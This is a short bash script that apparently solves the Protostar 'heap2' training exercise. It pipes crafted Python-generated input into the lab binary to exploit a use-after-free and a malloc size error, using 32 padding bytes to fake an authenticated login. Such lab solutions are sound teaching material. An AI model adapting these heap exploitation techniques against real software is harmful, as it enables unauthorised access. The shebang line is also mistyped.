#!/bin/bashs

## USER-AFTER-FREE VULNERABILITY ##
/usr/bin/python -c "print('auth \n' + 'reset\n' + 'service ' + 'A' * 32 + 'FAKE\n' + 'login')" | /opt/protostar/bin/heap2

## EXPLOITING BAD USE OF malloc() -> malloc(sizeof(auth)) != malloc(sizeof(struct auth)) ##
/usr/bin/python -c "print('auth \n' + 'service ' + 'A' * 32 + 'FAKE\n' + 'login')" | /opt/protostar/bin/heap2